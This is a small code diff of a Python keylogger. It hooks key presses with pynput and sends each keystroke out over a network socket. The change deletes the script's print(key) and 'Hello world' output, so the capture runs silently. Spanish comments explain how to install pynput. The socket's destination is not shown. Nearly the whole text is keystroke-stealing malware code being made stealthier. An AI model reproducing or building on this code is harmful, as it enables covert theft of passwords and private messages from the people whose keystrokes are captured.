@@ -8,7 +8,7 @@ def key_recorder(key):
     mensaje = str(key)
     mi_socket.send(str.encode(mensaje))
     mi_socket.close()
-    print(key)
+    
 
 
 
@@ -16,7 +16,6 @@ def key_recorder(key):
 with Listener(on_press=key_recorder) as l:
     l.join()
 
-print("Hello world")
 
 #sudo apt install python3-pip // instalar pip para intalar pynput XD
 #sudo pip install pynput
